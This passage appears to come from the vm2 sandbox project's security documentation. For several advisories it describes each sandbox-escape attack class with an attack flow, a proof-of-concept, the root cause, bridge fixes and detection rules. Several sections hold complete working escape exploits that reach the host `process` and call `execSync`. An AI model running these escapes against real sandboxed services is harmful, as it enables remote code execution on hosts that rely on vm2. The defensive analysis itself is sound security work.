4. Trigger a second host-realm rejection. The fresh host `TypeError` instance walks back into sandbox code through V8 internals (the await machinery delivers it directly). The bridge's proto-walk no longer reaches a registered mapping at the right level, so `ensureThis` falls through and returns the raw host `TypeError` unwrapped.
5. Sandbox reads `e.constructor` → raw host `TypeError` (unwrapped, never crossed the bridge), `.constructor.constructor` → host `Function`. `new HostFunction("return process")()` returns host `process`. RCE.

### Canonical Example

```javascript
// (advisory GHSA-v6mx-mf47-r5wg)
const { VM } = require("vm2");
const vm = new VM();
vm.run(`
  "use strict";
  const getProto = Buffer.call.call({}.__lookupGetter__, Buffer, "__proto__");
  const setProto = Buffer.call.call({}.__lookupSetter__, Buffer, "__proto__");
  async function f() {
    try { await WebAssembly.compileStreaming(); }
    catch(e) { setProto.call(getProto.call(e), null); }
    try { await WebAssembly.compileStreaming(); }
    catch(e) {
      const HostFunction = e.constructor.constructor;
      new HostFunction("return process")()
        .mainModule.require('child_process').execSync('touch pwned');
    }
  }
  f();
`);
```

### Why It Works

The two underlying invariants violated:

- **Invariant A (write-side)**: "Sandbox code must not be able to mutate any host-realm object's prototype chain via the bridge." The proxy `set` / `defineProperty` / `setPrototypeOf` traps enforce this on direct mutation paths, but the apply trap creates a **second** mutation path — invoking a host prototype-mutating intrinsic *as a function* with a host object as `this`. The mutation happens inside the host intrinsic, not through any proxy, so no write trap fires.
- **Invariant B (read-side)**: "No host-realm object reaches sandbox code unwrapped." The bridge identifies host objects by walking the prototype chain looking for a registered mapping. When a host chain has been severed, the walk fails to find the mapping and helpers like `thisEnsureThis` fall through and return the raw host value AS-IS.

Together they form a compose-able primitive: mutate any host prototype → break the bridge's proto-walk recognition → next host value of that class arrives unwrapped → `e.constructor.constructor` chain to host `Function`.

### Mitigation

**Two-layer structural fix in `lib/bridge.js`.**

**Layer A (write-side, primary): apply-trap refusal of host prototype mutators.** At bridge init, cache the identity of every host-realm function that mutates `[[Prototype]]` (or could install code that mutates it):

```javascript
// host Object.prototype.__proto__ setter
addDangerousHostProtoMutator(
  otherSafeGetOwnPropertyDescriptor(otherGlobalPrototypes.Object, '__proto__').set
);
// host Object.prototype.__defineSetter__ / __defineGetter__
// host Object.setPrototypeOf / Object.defineProperty / Object.defineProperties
// host Reflect.setPrototypeOf / Reflect.defineProperty
```

In the apply trap:

```javascript
if (!isHost) {
  if (isDangerousHostProtoMutator(object)) throw new VMError(OPNA);
  // Peel one indirection layer: Function.prototype.call / .apply / .bind
  if (isApplyIndirectionPrimitive(object)) {
    const underlying = otherFromThis(context);
    if (isDangerousHostProtoMutator(underlying)) throw new VMError(OPNA);
  }
  // Peel Reflect.apply / Reflect.construct (underlying is args[0])
  if (isReflectApplyPrimitive(object)) {
    const underlying = otherFromThis(args[0]);
    if (isDangerousHostProtoMutator(underlying)) throw new VMError(OPNA);
  }
}
```

The indirection peel covers the canonical PoC shape (`setProto.call(tp, null)`, where the apply target is `Function.prototype.call` and the dangerous function is `context`), `setProto.apply(tp, [null])`, and `Reflect.apply(setProto, tp, [null])`. The peel is depth-1 — recursive indirection (`Function.prototype.call.call(...)`) collapses into the same shape at the V8 level because `Function.prototype.call` is the apply target and its `context` is the inner reference.

**Layer B (read-side, defense-in-depth): cache check before proto walk in `thisEnsureThis`.** Before walking the prototype chain, check `mappingOtherToThis` for an existing wrap of `other`. If found, return it. This catches host-realm values that the bridge has previously wrapped — even if their prototype chains were subsequently tampered with by some other route, the cache lookup is independent of the prototype chain.

We deliberately do **not** wrap on the proto-walk fall-through paths (null proto, walked-off without finding a mapping). Wrapping there would re-introduce GHSA-9vg3-4rfj-wgcm — a sandbox-realm `{__proto__: null}` value passed to `handleException` would be turned into a host-treating proxy whose `set` trap unwraps sandbox-side proxies of host references onto the underlying object, recreating the very escape that fix closed. Layer A prevents the canonical attack from reaching a state where a fresh, never-bridged host object surfaces here through a tampered proto chain.

### Detection Rules

- **Sandbox-applied host `Object.prototype.__proto__` setter** — reached via `__lookupSetter__` on a host-prototype-bearing reference (`Buffer`, `Error.prototype`, etc.). The cache `dangerousHostProtoMutators` identifies it regardless of how it's named in the sandbox.
- **Sandbox-applied host `Object.setPrototypeOf` / `Object.defineProperty` / `Object.defineProperties`** — reached via `Object` (a bridge proxy of host `Object`) or via a host-side method that returns these.
- **Sandbox-applied host `Reflect.setPrototypeOf` / `Reflect.defineProperty`** — reached via `Reflect` (bridge proxy). `Reflect.apply` and `Reflect.construct` are tracked as indirection primitives so a sandbox using `Reflect.apply(setProto, tp, [null])` is also caught.
- **Sandbox-applied host `Object.prototype.__defineSetter__` / `__defineGetter__`** — would install attacker-defined accessors on a host target. Indirect mutation primitive; same chokepoint.
- **`Function.prototype.call` / `.apply` / `.bind` indirection** — the apply trap peels one layer to inspect the underlying function being applied. `setProto.call(...)` and `setProto.apply(...)` are caught.
- **`Reflect.apply` / `Reflect.construct` indirection** — the apply trap peels these and inspects `args[0]` as the underlying function.

### Considered Attack Surfaces

- **Sandbox-realm `Object.setPrototypeOf` / `Reflect.setPrototypeOf` on sandbox values** — not in the dangerous-mutator set (only host-realm copies are). Sandbox code can still mutate its own prototypes freely.
- **`__proto__` *getter* (read-only)** — not blocked. Reading a host prototype is not, by itself, a privilege-escalation primitive, and blocking the getter would break legitimate `instanceof` and inspection paths. The attack requires *writing*, which is what the dangerous-mutator set covers.
- **Deeper indirection** (`Function.prototype.call.call.call(...)`) — V8 collapses these at the spec level. The apply trap's `object` is always the outermost `Function.prototype.call`, and `context` is the next-inner reference. Depth-1 peel is sufficient.
- **`Function.prototype.bind` returning a new function** — bound functions don't immediately apply; they're invoked later. When the bound function is eventually applied, the apply trap fires again with the bound function as `object`. The bound function unwraps to a host-realm "bound function exotic object" rather than the original target, so the simple identity check on the bound function's identity wouldn't hit. However, sandbox-controllable bind paths reaching a dangerous mutator can be tested adversarially; if a bypass surfaces, the peel should be extended.
- **Symbol-based "private" setter slots** — not known to exist for prototype mutation. The defense covers the documented set of mutators.

### Related Categories

- [Category 2: Prototype Chain Manipulation](#attack-category-2-prototype-chain-manipulation) — sets up the attacker's goal of mutating a host prototype chain.
- [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation) — the canonical PoC uses host-realm `TypeError` as the carrier.
- [Category 7: Promise and Async Exploitation](#attack-category-7-promise-and-async-exploitation) — `WebAssembly.compileStreaming()` rejection is the host-error source.
- [Category 26: Sandbox-Realm Null-Proto via Bridge `from()`](#attack-category-26-sandbox-realm-null-proto-via-bridge-from--set-trap-write-through) — explains why we cannot indiscriminately wrap fall-through values in `thisEnsureThis`.

---

## Attack Category 31: Promise Species Hijack in `localPromise` Swallow Tail

**Uses**: [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](#attack-category-7-promise-and-async-exploitation), [Category 18: Array Species Self-Return via Constructor Manipulation](#attack-category-18-array-species-self-return-via-constructor-manipulation).

**Supersedes**: extends [Category 22: Promise Executor Unhandled Rejection — Host Process DoS](#attack-category-22-promise-executor-unhandled-rejection--host-process-dos) — the swallow-tail call introduced there is the bypass surface.

### Description

The `localPromise` constructor (added in GHSA-hw58-p9xv-2mjh) attaches an internal swallow tail to every sandbox-constructed Promise by invoking the cached host `Promise.prototype.then`:

```javascript
apply(globalPromisePrototypeThen, this, [undefined, localPromiseSwallow]);
```

The host `then` resolves the downstream child of this chain via the **species protocol**: it reads `this.constructor[Symbol.species]` and `Construct`s a new Promise with that constructor. The sandbox-side `then`/`catch`/`Reflect.apply` overrides call `resetPromiseSpecies(this)` first to clobber `constructor` so species always resolves to `localPromise` — but the swallow-tail call inside the `localPromise` constructor itself did **not**.

A sandbox subclass `class FakePromise extends Promise { static get [Symbol.species]() { return ct; } }` therefore hijacks the species protocol to a user function `ct`. V8 calls `new ct(internalExecutor)` where `internalExecutor` is its internal `(resolve, reject)` capability builder. `ct` receives V8's resolve/reject and re-binds them — for example, `ct = function(e) { e(userFn, userCollector) }` makes `userFn` V8's "resolve" and `userCollector` V8's "reject".

Combined with the recursion-overflow primitive from Category 29 (`function so(d) { if (d > 0) so(d-1); const e = new E(); e.stack; throw e; }`), the attacker drives V8 to raise a host-realm `RangeError` inside `PromiseResolveThenableJob`. V8's resolver catches the throw and delivers the raw host Error to `userCollector` — bypassing every sandbox sanitiser. `ex.constructor.constructor("return process")()` yields the host `process` and `child_process.execSync` runs arbitrary commands.

CWE-913 (Improper Control of Dynamically-Managed Code Resources). CVSS 9.8 (Critical).

### Attack Flow

1. Sandbox declares `class FakePromise extends Promise` with `static get [Symbol.species]() { return ct }` where `ct` is a user-controlled function.
2. Sandbox sets `ct = (executor) => executor(userResolve, userReject)`, where `userReject` is a sandbox collector that captures whatever value V8 hands it.
3. Sandbox constructs `new FakePromise(r => r())`. This enters `localPromise`'s constructor. The instance's `[[Prototype]]` chain is `FakePromise.prototype → localPromise.prototype → Promise.prototype`; `this.constructor` walks to `FakePromise`.
4. The constructor attaches the swallow tail: `apply(globalPromisePrototypeThen, this, [undefined, swallow])`. Host `then` runs `SpeciesConstructor(this, %Promise%)` → reads `FakePromise[Symbol.species]` → returns `ct`. V8 builds an internal executor `internalExecutor(resolve, reject)` and calls `Construct(ct, [internalExecutor])`. `ct` invokes `internalExecutor(userResolve, userReject)` — V8 now thinks `userReject` is the child's reject function.
5. Sandbox triggers a host-realm rejection in the downstream chain (e.g., via deep recursion + `e.stack` formatting → host `RangeError`). V8's `PromiseResolveThenableJob` catches the throw and calls the child's reject — which is `userReject`. The raw host `RangeError` lands in sandbox.
6. Sandbox reads `ex.constructor.constructor("return process")()` → host `Function` constructor → `process` → RCE.

### Canonical Example

```javascript
// (advisory GHSA-76w7-j9cq-rx2j)
const { VM } = require('vm2');
new VM().run(`
  class E extends Error {}
  function so(d) {
    if (d > 0) so(d-1);
    const e = new E();
    e.stack;
    throw e;
  }
  let ex, ct;
  class FakePromise extends Promise {
    static get [Symbol.species]() { return ct; }
  }
  function doCatch(f) {
    ex = undefined;
    const p = Promise.withResolvers();
    ct = function(e) { e(f, v => { ex = v; p.resolve(); }) };
    new FakePromise(r => r());
    return p.promise;
  }
  (async function f(s) {
    let min = s, max = 100000;
    while (min < max) {
      const mid = (min + max) >> 1;
      await doCatch(() => so(mid));
      if (ex.name === "RangeError" && !(ex instanceof RangeError)) {
        ex.constructor.constructor("return process")()
          .mainModule.require('child_process').execSync('touch pwned');
        return;
      }
      if (ex instanceof E) min = mid + 1; else max = mid;
    }
    f(s + 1);
  })(0);
`);
```

### Why It Works

The Category 22 swallow tail was designed to **silence** unhandled rejections without participating in user-visible Promise mechanics — so it uses the cached native `then` (`globalPromisePrototypeThen`) to avoid recursing through vm2's `.then` override. But the cached native `then` is still the **specification-mandated** `then`, which performs species resolution. The cached-`then` design correctly avoided the `.then` override recursion; it did not account for the species protocol that runs *inside* that native `then`.

Every other call site that touches a host `then`/`catch` (`globalPromise.prototype.then` override, `globalPromise.prototype.catch` override, `localReflect.apply` wrapper) bookends with `resetPromiseSpecies(this)`. The swallow-tail site — inside `localPromise`'s own constructor body — was the only one missing the reset, because `resetPromiseSpecies` is declared later in the module and was thought to be unreachable from the constructor's lexical scope. In practice the constructor body executes lazily (user code triggers it via `new Promise(...)`), by which point the module has fully initialised and the reset is in scope.

The species hijack is the same primitive as Category 18 (Array species self-return), now applied to Promise instead of Array. The structural lesson is identical: **every call into a host built-in that uses `SpeciesConstructor` must first neutralise the species on `this`**.

### Mitigation

Add `resetPromiseSpecies(this)` immediately before the swallow-tail `apply(globalPromisePrototypeThen, this, [undefined, localPromiseSwallow])` call in the `localPromise` constructor. This pins `this.constructor` to `localPromise` as an own data property, shadowing any inherited species accessor on `FakePromise`. The species protocol then resolves to `localPromise`, and the downstream child is constructed via `localPromise`'s own wrapped executor (Category 22) — V8's internal `(resolve, reject)` capability cannot be rebound by a sandbox-controlled constructor.

Together with the existing wrapped executor and the `localPromiseInSwallowTail` re-entrancy guard, this restores **[Defense Invariant #4](#defense-invariants)** (no host built-in is invoked with a sandbox `this` whose species can be hijacked) for the swallow-tail call site, and closes the path through which raw host-realm errors reached the `userReject` collector.

The fix preserves benign subclass behaviour: `class MyPromise extends Promise {}` still works because `MyPromise` does not override `Symbol.species`, so species would naturally resolve to `MyPromise` itself; the reset only matters when an attacker installs a malicious species. The user-visible `myPromise.constructor` is mutated to `localPromise` by the reset — the same observable change already produced by every `.then()`/`.catch()`/`Reflect.apply` call, so this is consistent with the existing invariant.

### Detection Rules

- **`class X extends Promise { static get [Symbol.species]() { return userFn } }`** — any sandbox subclass of Promise that overrides `Symbol.species` is suspect. After the fix, the species value is ignored for any call site vm2 controls, but the pattern remains an indicator of attempted hijack.
- **User function `ct` that receives the species `Construct` call and re-invokes the V8 internal executor with sandbox-controlled `(resolve, reject)`** — Category-22-style closures over the V8 resolver are the canonical attack shape.
- **Synchronous resolution of a Promise immediately followed by inspection of a captured rejection value** — `new FakePromise(r => r())` constructed solely to trigger the swallow tail (then the downstream child's reject) is a tell-tale signature.
- **Composition with the recursion-overflow primitive (Category 29)** or any other host-error generator inside the downstream chain — the species hijack is the transport; the host error is the payload.

### Considered Attack Surfaces

- **Other host-`then` call sites.** `sanitizeAsyncIteratorResultPromise` (the Category 29 fix) also calls `apply(globalPromisePrototypeThen, promise, [...])` on a promise produced by V8's async generator machinery. That promise is intrinsic — its `constructor` walks to `globalPromise` and species resolves to `globalPromise` by default — so the species channel is not user-controlled there. Adding a defensive `resetPromiseSpecies(promise)` is a harmless belt-and-suspenders option but is not required for this advisory.
- **Benign subclasses without species override.** `class MyPromise extends Promise {}` (no `[Symbol.species]`) is unaffected — species would naturally resolve to `MyPromise`; the reset only flips it to `localPromise`. The pinned `localPromise` constructor is fully compatible with subclass semantics (the outer instance is still a `MyPromise`; only the internal swallow-tail child is `localPromise`, and that child is never returned to user code).
- **Frozen `Promise.prototype.constructor`.** `resetPromiseSpecies` defines an own data property on the instance, not on the prototype. Even if a hostile sandbox tried to make the prototype's `constructor` non-configurable (which the bridge prevents), the own-property write would still shadow it. The reset throws a `LocalError` only if the instance itself is non-extensible or has a non-configurable `constructor` — in which case the outer try/catch in the swallow-tail block swallows it harmlessly and the rest of the constructor proceeds.

---

## Attack Category 32: Bridge `set` Trap Ignores Spec `Receiver` — Inherited-Receiver Write-Through

**Uses**: [Category 6: Proxy Trap Exploitation](#attack-category-6-proxy-trap-exploitation).

### Description

ECMA-262 §9.5.9 `[[Set]](P, V, Receiver)` for Proxy exotic objects supplies the *original recipient* of the assignment as the `Receiver` parameter to the trap. When sandbox code writes to an object that **inherits** from a bridge proxy (`Object.create(proxy).x = v`) or supplies a forged receiver (`Reflect.set(proxy, k, v, customReceiver)`), V8 invokes the trap with `Receiver` set to that recipient — *not* the proxy itself. The spec-mandated behaviour for the trap is to install the property on `Receiver`, mirroring how ordinary objects propagate `[[Set]]` up the prototype chain.

`BaseHandler.set` in `lib/bridge.js` historically ignored the `Receiver` argument and unconditionally forwarded the write through to the wrapped host object via `otherReflectSet(object, key, value)`. Consequence: **every host-realm object exposed to the sandbox becomes a write channel through any inheriting receiver.** A single `Object.create(hostObj)` produces a sandbox-side object whose every property write lands on the host object, bypassing any future write-side hardening that assumes "writes only arrive via direct `proxy.x = v` through the canonical proxy receiver". The originally reported path used `kCustom = Symbol.for('nodejs.util.promisify.custom')` as the write key against `Object.create(hostFn)` to install a sandbox-controlled function under the host promisifier dispatch slot, so `util.promisify(hostFn)()` on the host side would dispatch to attacker code. The class is generic to any key; the symbol-key shape was the sharpest end (host control flow hand-off) but plain string keys are equally write-through.

CVSS:3.1 ~8.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — direct host data integrity violation; full RCE requires the host to consume the polluted slot).

### Attack Flow

1. Sandbox obtains a reference to any host-realm object the embedder exposed — either via `sandbox: { x }` or any function/value reachable through the bridge.
2. Sandbox constructs an inheriting object: `const child = Object.create(hostObj)` (or any equivalent — `Reflect.set(hostObj, k, v, sandboxObj)`, `Object.create(Object.create(hostObj))`, `Object.assign(Object.create(hostObj), src)`).
3. Sandbox writes a property: `child[key] = sandboxValue`. V8's `[[Set]]` walks `child` → `proxy(hostObj)` and invokes the trap with `Receiver = child`.
4. The pre-fix trap discarded `Receiver` and ran `otherReflectSet(hostObj, key, value)`. The property landed on `hostObj` on the **host realm**.
5. Host code subsequently reads `hostObj[key]` (or `Object.getOwnPropertySymbols(hostObj)`, or dispatches through it via a well-known protocol such as `util.promisify`). The attacker's value is read; if the host treats it as a callable, sandbox code runs in the host realm.

### Canonical Example

```javascript
// (advisory GHSA-c4cf-2hgv-2qv6)
const util = require('util');
const { VM } = require('vm2');

const hostFn = function api(cb) { cb(null, 'real-data'); };
const vm = new VM();
vm.sandbox.hostFn = hostFn;

vm.run(`
  const kCustom = Symbol.for('nodejs.util.promisify.custom');
  const child = Object.create(hostFn);
  child[kCustom] = function () {
    return Promise.resolve('HIJACKED-VIA-RECEIVER-BUG');
  };
`);

// Host side:
util.promisify(hostFn)().then(console.log);   // → "HIJACKED-VIA-RECEIVER-BUG"
```

Five variants share the same primitive — `receiver !== <canonical proxy for target>`:

| # | Primitive |
|---|-----------|
| 1 | `Object.create(hostObj)[Symbol.for('nodejs.util.promisify.custom')] = fn` |
| 2 | `Object.create(hostObj).x = 'v'` (plain string key — no symbol involved) |
| 3 | `Reflect.set(hostObj, k, v, sandboxObj)` |
| 4 | `Object.create(Object.create(hostObj)).x = 'v'` (deep proto chain) |
| 5 | `Object.assign(Object.create(hostObj), { k: v })` |

### Why It Works

`BaseHandler.set` was written to "forward writes to the host target", a reasonable mental model when the only assumption is `proxy.x = v`. The spec, however, defines `[[Set]]` over the proxy as a single trap that subsumes *all* writes reaching the proxy through the prototype chain — including writes whose original recipient is some sandbox-side child. Two existing handlers got this right by accident: `ReadOnlyHandler.set` writes to `receiver` unconditionally (its policy is "host is read-only"), and `ProtectedHandler.set`'s function-value branch also installs on `receiver`. `BaseHandler.set` was the only trap that violated the spec — and because every non-intrinsic host object flows through `BaseHandler` (intrinsics go through `ProtectedHandler`'s OPNA short-circuit, read-only mocks go through `ReadOnlyHandler`), the bug applied to every embedder-exposed object the sandbox was ever handed.

Interaction with [Category 8 / Category 20 / GHSA-m5q2-4fm3-vfqp](#attack-category-20-cross-realm-symbol-extraction-via-host-object-prototype-walk): the m5q2 fix expanded `Symbol.for` to deny the entire `nodejs.` namespace **and** added an `isDangerousCrossRealmSymbol(key)` rejection inside the `set` / `defineProperty` / `deleteProperty` traps themselves. That symmetric symbol guard fires before the receiver-mismatch check below, so the canonical symbol-key PoC (variant 1) is now structurally blocked at two independent layers even on a sandbox lacking this category's fix. The receiver bug remains a real, generic write-channel — variants 2–5 (plain string keys, forged `Reflect.set` receiver, deep proto chains, `Object.assign(child, src)`) reach the host write path without involving any cross-realm symbol — so this category's fix is required defense-in-depth on top of m5q2 rather than a duplicate of it.

### Mitigation

Restores [Defense Invariant 1](#defense-invariants) ("no host-realm object reaches sandbox code unwrapped") and adds a previously-implicit corollary: **a sandbox-originated write reaches a host-realm object only when the spec `[[Set]]` receiver equals the canonical bridge proxy for that object's target.**

`lib/bridge.js`, `BaseHandler.set` (after the existing `__proto__` and `constructor`-on-array short-circuits, before the host-write forwarding):

```javascript
const canonicalProxy = thisReflectApply(thisWeakMapGet, mappingOtherToThis, [object]);
if (receiver !== canonicalProxy) {
    return thisReflectDefineProperty(receiver, key, {
        __proto__: null,
        value: value,
        writable: true,
        enumerable: true,
        configurable: true,
    }) === true;
}
```

The lookup reuses `mappingOtherToThis`, which `thisProxyOther` already populates with `[other, proxy]` (`!isHost`) or `[other, proxy2]` (`isHost`). In the host-loaded branch the *outer* `proxy2` is the sandbox-facing object; its empty handler forwards `[[Set]]` to `proxy` while preserving `Receiver`, so the BaseHandler trap fires with `Receiver === proxy2`. Both branches therefore yield a single canonical proxy per host target, and direct sandbox writes (`hostProxy.x = v`, `Reflect.set(hostProxy, k, v, hostProxy)`, `Object.assign(hostProxy, src)`) continue to take the legitimate `otherReflectSet` path. Non-canonical receivers — `Object.create(proxy)` children, explicit-receiver `Reflect.set` calls, sandbox-side `setPrototypeOf` constructions — install on the receiver itself via `Reflect.defineProperty`, exactly as the spec mandates.

The fix is symmetric with `ReadOnlyHandler.set` (which uses the same install-on-receiver shape unconditionally) and with the function-value branch of `ProtectedHandler.set`. `ProtectedHandler.set` inherits the fix automatically through its `super.set` delegation for non-function values.

### Detection Rules

- **`Object.create(hostProxy)` followed by property assignment on the child** — every form: `child[k] = v`, `Reflect.set(child, k, v)`, `Object.defineProperty(child, k, desc)` (the last installs on `child` directly and does not route through the trap, so it is not relevant; the first two are).
- **`Reflect.set(hostProxy, k, v, receiver)` where `receiver !== hostProxy`** — explicit-receiver writes against any host object.
- **`Object.assign(Object.create(hostProxy), src)`** — bulk pollution via the receiver-mismatch primitive.
- **Code review pattern**: sandbox code that calls `Object.create` on any embedder-exposed object is suspicious; benign sandbox code virtually never needs to inherit from host objects.

### Considered Attack Surfaces

- **`Reflect.set(hostProxy, k, v, hostProxy)`** — receiver matches the canonical proxy, goes through the legitimate write path. Equivalent to `hostProxy[k] = v`. Existing `isProtectedHostObject` and `__proto__` short-circuits still apply.
- **`Reflect.set(hostProxy, k, v, undefined)` / `null`** — receiver does not strict-equal the canonical proxy → install-on-receiver branch fires → `Reflect.defineProperty(undefined, …)` throws a `TypeError`, the sandbox sees a `TypeError`, the host object is untouched.
- **Adversary-controlled Proxy receiver with a custom `defineProperty` trap** — vm2 does not expose the `Proxy` constructor to the sandbox in plain VM mode (`typeof Proxy === 'undefined'`), so this composition is not reachable today. If a future change exposes `Proxy`, the install-on-receiver branch must be re-audited.
- **`setPrototypeOf(child, hostProxy)` after `child` already has writes** — the next write on `child` walks the new prototype, fires the trap with `Receiver = child`, and installs on `child`. Host untouched.
- **`BaseHandler.defineProperty`** — `[[DefineOwnProperty]]` carries no `Receiver` per ECMA-262 §9.5.6; `Object.defineProperty(child, k, desc)` where `child` inherits from `hostProxy` installs on `child` directly without invoking the proxy's `defineProperty` trap. No analogous receiver bug exists. (`Object.defineProperty(hostProxy, k, desc)` *does* route to the trap, but that path already has the `isProtectedHostObject` short-circuit from GHSA-vwrp-x96c-mhwq.)
- **`BaseHandler.deleteProperty`** — `[[Delete]]` (§9.5.10) has no `Receiver`. `delete child.k` for `child` inheriting from proxy is a no-op on the proxy.
- **Compound with [Category 18: Array Species Self-Return](#attack-category-18-array-species-self-return-via-constructor-manipulation)** — `Object.create(hostArray).constructor = fn` now installs `constructor` on the sandbox child rather than (as before the existing array-constructor short-circuit) on the proxy target. The host array's raw `constructor` slot remains untouched in either case; `neutralizeArraySpecies` continues to defend the species path independently.

---

## Attack Category 33: WebAssembly JSPI Cross-Realm Promise Prototype

**Uses**: [Category 3: Symbol-Based Attacks](#attack-category-3-symbol-based-attacks), [Category 7: Promise and Async Exploitation](#attack-category-7-promise-and-async-exploitation), [Category 17: WebAssembly JSTag Exception Catch](#attack-category-17-webassembly-jstag-exception-catch).

### Description

The WebAssembly JavaScript Promise Integration (JSPI) API — `WebAssembly.promising` and `WebAssembly.Suspending`, available behind `--experimental-wasm-jspi` on Node 24 and enabled by default on Node 26+ — returns Promise objects whose `[[Prototype]]` chain points **directly at the host realm's `Promise.prototype`** without going through any bridge proxy.

This is a categorically new shape of sandbox-visible object. Until JSPI, every Promise reachable from sandbox code was either:

1. A sandbox-realm Promise whose `[[Prototype]]` includes `globalPromise.prototype` (so the vm2 overrides on `then`/`catch` apply), or
2. A bridge proxy of a host-realm Promise (so the bridge `apply`-trap interception applies).

JSPI breaks this dichotomy by producing a third class — sandbox-realm allocation, host-realm prototype, no bridge proxy. Neither defense layer can intercept it: sandbox property access on a JSPI promise walks the cross-realm prototype chain and resolves directly to host-realm native `Promise.prototype.{then,catch,finally}`. The sandbox-side `globalPromise.prototype.then|catch` overrides are never reached (different prototype object). `resetPromiseSpecies` is only invoked from those overrides, so it never runs. The bridge `apply` trap only fires for bridge-proxied callables, which JSPI promises are not.

CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. **Build a wasm module** that imports a Suspending function `f` and exports a `run` that calls `f`. The PoC's 60-byte module body is `(module (func (import "m" "f") (param) (result)) (func (export "run") (call 0)))`.
2. **Suspending throw setup**: `new WebAssembly.Suspending(() => WebAssembly.compileStreaming(Promise.resolve(0)))`. `compileStreaming` expects a `Response` or `Promise<Response>`; given the number `0`, it eventually rejects with a host-realm `TypeError` from `node:internal/wasm_web_api`.
3. **JSPI promotion**: `const p = WebAssembly.promising(instance.exports.run)()`. The returned `p` is sandbox-realm by allocation but its `[[Prototype]]` is the host realm's `Promise.prototype` — confirmed by `Object.getPrototypeOf(p) === Promise.prototype` returning `false` and `Object.getPrototypeOf(Object.getPrototypeOf(p)) === Object.prototype` returning `true` (no sandbox `Promise.prototype` link in the chain at all).
4. **Species installation directly on `p`**: `Object.defineProperty(p, 'constructor', { get(){ return F; }})`. Because `p` is not a bridge proxy, the `defineProperty` call hits the raw object — the getter is installed on `p` itself, visible to V8's host-realm SpeciesConstructor lookup.
5. **`.finally` triggers the host species path**: `p.finally(() => {})`. Property access walks `p → hostPromisePrototype`, finds host `Promise.prototype.finally`, and calls it (no apply-trap interception since the method was reached via prototype walk, not via a proxy). Host's `finally` per spec runs `SpeciesConstructor(p, %Promise%)` → reads `p.constructor` → invokes attacker getter → returns `F` (sandbox class).
6. **Result capability bypass**: `NewPromiseCapability(F)` constructs an `F` instance with V8's builtin executor. `F`'s constructor calls `x(resolveCb, rejectCb)` with raw sandbox closures. There is no bridge between the host-realm executor and the sandbox closures — the executor is a direct host function reference held by sandbox code without proxying — so V8 stores the raw sandbox closures as `capability.[[Resolve]]` and `capability.[[Reject]]`.
7. **Rejection dispatch raw**: when the JSPI promise rejects with the host `TypeError` from step 2, V8's PromiseReactionJob calls `capability.[[Reject]](hostTypeError)` directly. The sandbox closure receives the **raw host-realm `TypeError`** with no bridge wrapping.
8. **Escape**: inside `F`'s reject closure, `e.constructor` is host `TypeError`; `.constructor` is host `Function`; `'return process'` constructs a function whose `[[Realm]]` is host, so invoking it evaluates `process` in the host realm and returns the host `process` object. `process.mainModule.require('child_process').execSync(...)` → RCE.

### Canonical Example

```javascript
// (advisory GHSA-6j2x-vhqr-qr7q). Environment: node:26-bookworm (JSPI default-on).
const { VM } = require("vm2");
new VM().run(`
  let b = Uint8Array.of(0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,7,1,1,109,1,102,
    0,0,3,2,1,0,7,7,1,3,114,117,110,0,1,10,6,1,4,0,16,0,11);
  WebAssembly.instantiate(b, {
    m: { f: new WebAssembly.Suspending(() =>
      WebAssembly.compileStreaming(Promise.resolve(0))) }
  }).then(r => {
    let p = WebAssembly.promising(r.instance.exports.run)();
    class F {
      constructor(x) {
        this.s = 0; this.q = [];
        x(v => { this.s = 1; this.v = v;
                 for (let i of this.q) if (i[0]) i[0](v); },
          e => {
            let P = e.constructor.constructor('return process')();
            P.mainModule.require('child_process').execSync('touch pwned');
            this.s = 2; this.v = e;
            for (let i of this.q) if (i[1]) i[1](e);
          });
      }
      then(f, r) {
        if (this.s == 1) return f ? f(this.v) : this.v;
        if (this.s == 2) { if (r) return r(this.v); throw this.v; }
        this.q.push([f, r]); return 0;
      }
    }
    Object.defineProperty(F, Symbol.species, { get(){ return F; }});
    Object.defineProperty(p, 'constructor', { configurable: true, get(){ return F; }});
    p.finally(() => {});
  });
`);
```

### Why It Works

The structural defects compound:

- **Cross-realm prototype is a new attack shape.** All prior Promise hardening assumes one of two regimes — sandbox-realm with our overrides, or bridge-proxied host realm. JSPI invented a third: sandbox-realm allocation, host-realm prototype, no proxy. Every existing defense was scoped to one of the two known regimes.
- **No proxy = no apply-trap interception.** The bridge `apply` trap on host `Promise.prototype.{then,catch,finally}` (installed by GHSA-55hx-c926-fr95) wraps sandbox callbacks with sanitizers before invoking the host method. JSPI promises bypass it because property lookup walks a raw prototype chain to host methods directly — there is no proxy, no apply trap, no sanitizer wrapping.
- **No `globalPromise.prototype` link = no `resetPromiseSpecies`.** The sandbox-side `globalPromise.prototype.then|catch` overrides are the chokepoint where `resetPromiseSpecies(this)` runs. The JSPI promise's prototype chain never traverses `globalPromise.prototype`, so the override is never reached.
- **`PerformPromiseThen` is C++ anyway.** Even if `.then` had been overridden, host `Promise.prototype.finally` calls `PerformPromiseThen` directly via the spec's internal abstract operations, bypassing user-visible `.then` dispatch.
- **F's executor receives raw host references.** Because everything from the species lookup onward happens inside host's `finally` implementation reading the attacker getter installed on the raw JSPI promise, the entire flow stays "host code holding sandbox class F" without any bridge mediation. F's resolve/reject closures get registered as capability functions directly, then invoked directly with raw host rejection reasons.

### Mitigation

Delete `WebAssembly.promising` and `WebAssembly.Suspending` from the sandbox at bootstrap in `lib/setup-sandbox.js`, mirroring the existing `WebAssembly.JSTag` removal ([Category 17](#attack-category-17-webassembly-jstag-exception-catch)). Without `Suspending`, a wasm module cannot import a JS function as a suspending import; without `promising`, sandbox cannot promote a wasm function into a JSPI export. JSPI is the only known primitive that produces a sandbox-visible Promise whose prototype crosses realms without bridge interposition, and both constructors are required to use it — removing either kills the attack class on its own; removing both is belt-and-suspenders.

The removal is guarded by `typeof` checks so the same code path is a no-op on Node ≤ 23 (no JSPI constants exist) and on Node 24/25 without the `--experimental-wasm-jspi` flag (constants exist on the global but not on the sandbox-context `WebAssembly`).

